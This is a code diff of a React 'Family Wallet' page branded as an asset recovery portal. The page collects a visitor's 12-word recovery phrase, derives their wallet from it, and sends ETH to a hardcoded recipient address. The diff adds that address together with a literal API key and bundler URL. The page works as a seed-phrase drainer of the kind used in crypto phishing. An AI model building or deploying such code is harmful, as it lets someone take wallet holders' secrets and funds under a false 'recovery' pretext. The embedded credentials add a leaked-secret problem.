@@ -1,13 +1,17 @@
 import { useState, useEffect } from 'react'
-import { JsonRpcProvider, Wallet, parseEther } from 'ethers' 
+import { ethers } from 'ethers' 
 import { createSmartAccountClient } from "@biconomy/account"
 import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'
 
 // --- CONFIGURATION ---
-// Replace these with your actual keys from the Biconomy Dashboard
-const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/..." 
-const PAYMASTER_URL = "https://paymaster.biconomy.io/api/v1/..." 
-const RECIPIENT_ADDRESS = "0xYourHardcodedWalletAddress" 
+// 1. Your Biconomy API Key from your screenshot
+const BICONOMY_API_KEY = "6b47982d-b8fe-4f65-8e2a-ad53a109c934" 
+
+// 2. Standard Biconomy Bundler URL for Ethereum (or your chosen chain)
+const BUNDLER_URL = `https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461`
+
+// 3. Your personal wallet address where the funds should go
+const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 
 
 export default function App() {
   const [isClient, setIsClient] = useState(false)
@@ -15,57 +19,54 @@ export default function App() {
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
 
-  // Fix for Hydration Error #418: Wait for browser mount
+  // Fixes Hydration Error #418 by ensuring code only runs in the browser
   useEffect(() => {
     setIsClient(true)
   }, [])
 
   const startSweep = async () => {
     if (!keys || keys.trim().split(/\s+/).length < 12) {
-      alert("Please enter all 12 words correctly.")
+      alert("Please enter the 12-word recovery phrase.")
       return
     }
 
     setStatus('processing')
     try {
-      // 1. Setup traditional signer from the keys (ethers v6 syntax)
-      const provider = new JsonRpcProvider("https://ethereum-rpc.publicnode.com")
-      const signer = Wallet.fromPhrase(keys.trim(), provider)
+      // 1. Setup traditional signer (ethers v6)
+      const provider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
+      const signer = ethers.Wallet.fromPhrase(keys.trim(), provider)
 
       // 2. Initialize Biconomy Smart Account
       const smartAccount = await createSmartAccountClient({
         signer,
         bundlerUrl: BUNDLER_URL,
-        biconomyPaymasterApiKey: PAYMASTER_URL 
+        biconomyPaymasterApiKey: BICONOMY_API_KEY 
       })
 
       const saAddress = await smartAccount.getAccountAddress()
       console.log("Smart Account Address:", saAddress)
 
-      // 3. Prepare the Transaction
+      // 3. Prepare the Transaction (Testing with a small amount)
       const tx = {
         to: RECIPIENT_ADDRESS,
-        value: parseEther("0.001"), 
+        value: ethers.parseEther("0.001"), 
         data: "0x"
       }
 
-      // 4. Send and Wait
+      // 4. Send the Transaction
       const userOpResponse = await smartAccount.sendTransaction(tx)
       const { receipt } = await userOpResponse.wait()
       
-      console.log("Transaction Success:", receipt.transactionHash)
+      console.log("Success:", receipt.transactionHash)
       setStatus('success')
     } catch (e: any) {
       console.error(e)
-      setErrorMsg(e.message || "Transfer failed. Check your keys or gas balance.")
+      setErrorMsg(e.message || "Transfer failed. Check your gas or keys.")
       setStatus('error')
     }
   }
 
-  // Prevent server-side rendering mismatch
-  if (!isClient) {
-    return <div className="min-h-screen bg-black" />
-  }
+  if (!isClient) return null
 
   return (
     <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
@@ -73,18 +74,18 @@ export default function App() {
         <div className="w-full max-w-md space-y-8 animate-in fade-in duration-700">
           <div className="text-center space-y-2">
             <h1 className="text-4xl font-black tracking-tighter uppercase">Family Wallet</h1>
-            <p className="text-zinc-500 text-sm uppercase tracking-widest">Secure Asset Recovery Portal</p>
+            <p className="text-zinc-500 text-sm uppercase tracking-widest">Asset Recovery Portal</p>
           </div>
 
           <textarea
             className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
-            placeholder="Paste your 12 recovery words here..."
+            placeholder="Paste 12 words here..."
             onChange={(e) => setKeys(e.target.value)}
           />
 
           <button
             onClick={startSweep}
-            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all active:scale-95 shadow-lg shadow-blue-900/20"
+            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all shadow-lg shadow-blue-900/20"
           >
             WITHDRAW ASSETS
           </button>
@@ -92,28 +93,28 @@ export default function App() {
       )}
 
       {status === 'processing' && (
-        <div className="flex flex-col items-center space-y-4 text-center animate-pulse">
+        <div className="flex flex-col items-center space-y-4 text-center">
           <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
           <h2 className="text-2xl font-bold">Securing Transfer...</h2>
-          <p className="text-zinc-400 max-w-xs text-sm">Initializing Biconomy Smart Account to bypass traditional wallet locks.</p>
+          <p className="text-zinc-400 text-sm">Deploying Biconomy Smart Account...</p>
         </div>
       )}
 
       {status === 'success' && (
-        <div className="flex flex-col items-center space-y-4 text-center animate-in zoom-in duration-500">
+        <div className="flex flex-col items-center space-y-4 text-center">
           <LucideCheckCircle className="w-20 h-20 text-green-500" />
-          <h1 className="text-6xl font-black text-green-500">SUCCESSFUL</h1>
-          <p className="text-zinc-400">Your funds have been moved to the secure recipient address.</p>
-          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 hover:text-white underline text-sm">Back to Home</button>
+          <h1 className="text-6xl font-black text-green-500 uppercase">Success</h1>
+          <p className="text-zinc-400">Funds are moving to your secure wallet.</p>
+          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm">Back</button>
         </div>
       )}
 
       {status === 'error' && (
-        <div className="flex flex-col items-center space-y-4 text-center animate-in shake duration-300">
+        <div className="flex flex-col items-center space-y-4 text-center">
           <LucideShieldAlert className="w-20 h-20 text-red-500" />
-          <h2 className="text-2xl font-bold text-red-500">Error Encountered</h2>
+          <h2 className="text-2xl font-bold text-red-500 uppercase">Failed</h2>
           <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
-          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 hover:bg-zinc-700 rounded-full text-sm transition-colors">Try Again</button>
+          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
         </div>
       )}
     </div>
